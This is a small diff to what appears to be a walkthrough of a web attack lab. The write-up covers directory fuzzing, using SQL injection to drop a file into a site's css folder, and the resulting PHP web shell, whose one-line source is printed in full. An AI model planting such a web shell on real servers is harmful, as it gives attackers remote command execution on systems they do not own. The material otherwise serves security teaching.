@@ -102,7 +102,7 @@ with `url.txt` a file containing common directory names for websites, we can fin
 
 ![Fuzzing a website](assets/wfuzz.png)
 
-Once the script injectied in our src folder, we can see that it appeared into our directory :
+We can then perform SQL injection on each directory we found. Once the script tries to inject the payload in `css` folder, we can see that it appeared into our directory :
 
 ![Webshell file located in css folder](assets/webshell-file.png)
 
@@ -112,7 +112,6 @@ Our file contains php code that will fetch the "cmd" parameter in our url, and r
 <?php
     system($_GET['cmd']);
 ?>
-
 ```
 
 Now that we have our php file on the server, we can execute code remotely:
